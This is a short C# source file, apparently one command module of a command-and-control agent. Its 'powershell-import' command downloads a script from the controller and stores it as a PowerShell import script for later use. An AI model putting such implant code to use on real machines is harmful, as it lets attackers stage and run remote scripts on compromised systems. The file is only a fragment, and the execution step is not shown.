using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellImportCommand : AgentCommand
    {
        public override string Name => "powershell-import";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if(string.IsNullOrEmpty(task.FileId))
            {
                Script = null;
                this.Notify(result, commm, $"Import script reseted.");
                return;
            }

            var fileContent = commm.Download(task.FileId, a =>
            {
                result.Info = $"Downloading {task.FileName} ({a}%)";
                commm.SendResult(result);
            }).Result;

            Script = Encoding.UTF8.GetString(fileContent);
            this.Notify(result, commm, $"{task.FileName} Dowloaded ans set ad Import script");
        }

        public static string Script { get; set; }
    }
}
